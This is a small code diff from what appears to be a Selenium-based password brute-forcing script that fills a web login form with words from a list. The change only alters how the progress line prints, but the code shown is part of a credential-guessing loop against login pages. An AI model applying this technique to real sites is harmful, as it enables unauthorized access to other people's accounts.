@@ -94,7 +94,7 @@ def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
             Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
             driver.find_element(By.CSS_SELECTOR, button_sel)
             Sel_user.send_keys(username)
-            print('[~] Attempting password '+ color.YELLOW+passwd+color.END, end='')
+            print('[~] Attempting password '+color.YELLOW+passwd+color.END, end='\r')
             Sel_pas.send_keys(passwd)
             time.sleep(int(delay))
             final_pass = passwd
